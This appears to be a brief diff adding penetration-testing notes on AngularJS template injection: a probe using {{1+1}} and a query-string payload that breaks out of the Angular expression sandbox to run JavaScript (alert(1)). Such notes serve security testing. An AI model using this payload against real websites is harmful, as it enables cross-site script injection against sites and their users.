@@ -1,0 +1,4 @@
+#test angular JS in apram by doing {{1+1}} and looking at output
+
+#payload:
+?search={{$on.constructor('alert(1)')()}}
